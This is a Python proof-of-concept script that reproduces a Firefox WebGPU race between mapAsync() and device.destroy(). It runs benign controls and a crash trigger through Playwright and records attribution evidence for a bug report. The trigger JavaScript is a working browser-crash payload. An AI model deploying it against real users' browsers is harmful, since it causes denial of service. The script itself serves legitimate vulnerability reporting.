#!/usr/bin/env python3
"""
Bug 02 — WebGPU mapAsync()/device.destroy() race — DETERMINISTIC DoS REPRODUCTION.
sn0x — single-purpose evidence generator.

Runs the negative-control matrix AND the trigger, each in a fresh browser, and
prints a PASS/CRASH table. The whole point is ATTRIBUTABILITY:

  * If a benign control (adapter-only, device-only, map-no-destroy) CRASHES, the
    WebGPU backend is unstable on this host and NO result is attributable to the
    bug — the script says so and exits non-zero.
  * If the controls all PASS and only the trigger CRASHES, that is clean,
    report-grade proof that the crash is caused specifically by the
    map-in-flight + destroy race.

Requires a WebGPU-capable host (hardware GPU / hardware Vulkan).
  Firefox 141+ ships WebGPU enabled by default on Windows; on Linux 146 it is
  behind dom.webgpu.enabled. System Release/ESR builds have WebGPU compiled out.

Usage:
  python3 dos_repro.py                # Playwright Firefox, headless
  python3 dos_repro.py --headed       # show the browser
  python3 dos_repro.py --runs 5       # repeat the whole matrix N times
"""
import argparse, asyncio, json, pathlib, sys, time

HERE = pathlib.Path(__file__).resolve().parent
EVID = HERE.parent / "evidence"
EVID.mkdir(exist_ok=True)
# Secure context: WebGPU requires HTTPS/localhost/file://. about:blank is unreliable.
CTX  = (HERE / "webgpu_worker_crash_minimal.html").as_uri()

PREFS = {
    "dom.webgpu.enabled": True,
    "dom.webgpu.workers.enabled": True,
    "gfx.webrender.all": True,
}

# Each scenario is a self-contained async function body run via page.evaluate.
SCN = {
    "control_adapter_only":
        "async()=>{const a=await navigator.gpu.requestAdapter();return a?'PASS:adapter':'NULL';}",
    "control_adapter_device":
        "async()=>{const a=await navigator.gpu.requestAdapter();if(!a)return'NULL';"
        "const d=await a.requestDevice();return 'PASS:device';}",
    "control_map_no_destroy":
        "async()=>{const a=await navigator.gpu.requestAdapter();if(!a)return'NULL';"
        "const d=await a.requestDevice();"
        "const b=d.createBuffer({size:4096,usage:GPUBufferUsage.MAP_READ|GPUBufferUsage.COPY_DST});"
        "await b.mapAsync(GPUMapMode.READ);b.getMappedRange();b.unmap();return'PASS:map';}",
    "control_destroy_no_map":
        "async()=>{const a=await navigator.gpu.requestAdapter();if(!a)return'NULL';"
        "const d=await a.requestDevice();"
        "const b=d.createBuffer({size:4096,usage:GPUBufferUsage.MAP_READ|GPUBufferUsage.COPY_DST});"
        "d.destroy();return'PASS:destroy';}",
    "TRIGGER_map_then_destroy":
        "async()=>{const a=await navigator.gpu.requestAdapter();if(!a)return'NULL';"
        "const d=await a.requestDevice();"
        "const b=d.createBuffer({size:4096,usage:GPUBufferUsage.MAP_READ|GPUBufferUsage.COPY_DST});"
        "const p=b.mapAsync(GPUMapMode.READ);d.destroy();"
        "try{await p;return'RESOLVED-AFTER-DESTROY';}catch(e){return'rejected:'+e.name;}}",
}

async def run_scenario(p, name, code, headed):
    """Return (result_str, crashed_bool)."""
    browser = await p.firefox.launch(headless=not headed, firefox_user_prefs=PREFS)
    page = await browser.new_page()
    crashed = False
    result = None
    try:
        await page.goto(CTX, wait_until="domcontentloaded")
        result = await asyncio.wait_for(page.evaluate(code), timeout=20)
    except asyncio.TimeoutError:
        result, crashed = "HANG(>20s)", True
    except Exception as e:
        # Tab/process gone => the page crashed.
        result, crashed = f"CRASH({type(e).__name__})", True
    finally:
        await browser.close()
    return result, crashed

async def main_async(args):
    from playwright.async_api import async_playwright
    rows = []
    async with async_playwright() as p:
        # adapter availability gate
        gate_browser = await p.firefox.launch(headless=not args.headed, firefox_user_prefs=PREFS)
        pg = await gate_browser.new_page()
        await pg.goto(CTX, wait_until="domcontentloaded")
        try:
            gpu = await pg.evaluate("typeof navigator.gpu")
        except Exception:
            gpu = "undefined"
        await gate_browser.close()
        if gpu == "undefined":
            print("ENV: navigator.gpu is undefined — WebGPU not exposed in this build.")
            print("     Use Firefox 141+ (WebGPU default) or enable dom.webgpu.enabled.")
            return 2

        for run in range(1, args.runs + 1):
            print(f"\n===== RUN {run}/{args.runs} =====")
            print(f"{'SCENARIO':<28} {'RESULT':<26} VERDICT")
            print("-" * 66)
            for name, code in SCN.items():
                res, crashed = await run_scenario(p, name, code, args.headed)
                verdict = "*** CRASH ***" if crashed else "ok"
                print(f"{name:<28} {str(res):<26} {verdict}")
                rows.append({"run": run, "scenario": name, "result": res, "crashed": crashed})

    # Attribution logic
    controls = [r for r in rows if r["scenario"].startswith("control_")]
    triggers = [r for r in rows if r["scenario"].startswith("TRIGGER")]
    any_control_crash = any(c["crashed"] for c in controls)
    any_null = any("NULL" in str(r["result"]) for r in rows)
    trig_crash = any(t["crashed"] for t in triggers)

    print("\n===== ATTRIBUTION =====")
    if any_null:
        print("INCONCLUSIVE: requestAdapter() returned NULL — no usable adapter on this host.")
        verdict = "no-adapter"
    elif any_control_crash:
        print("NOT ATTRIBUTABLE: a benign control crashed — WebGPU backend is unstable here.")
        print("                  Re-run on a hardware-GPU host. This run is NOT evidence.")
        verdict = "unstable-backend"
    elif trig_crash:
        print("CONFIRMED: all controls PASS, the trigger CRASHES.")
        print("           The crash is caused specifically by mapAsync-in-flight + device.destroy().")
        verdict = "BUG-CONFIRMED"
    else:
        print("NOT REPRODUCED: trigger did not crash (possibly patched on this build).")
        verdict = "not-reproduced"

    ts = time.strftime("%Y%m%d_%H%M%S")
    out = EVID / f"dos_repro_{ts}.json"
    out.write_text(json.dumps({"verdict": verdict, "rows": rows,
                               "prefs": PREFS}, indent=2))
    print(f"\nEvidence written: {out}")
    return 0 if verdict == "BUG-CONFIRMED" else 1

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--headed", action="store_true")
    ap.add_argument("--runs", type=int, default=3)
    args = ap.parse_args()
    print("Bug 02 — WebGPU mapAsync/destroy DoS — deterministic reproduction")
    sys.exit(asyncio.run(main_async(args)))

if __name__ == "__main__":
    main()
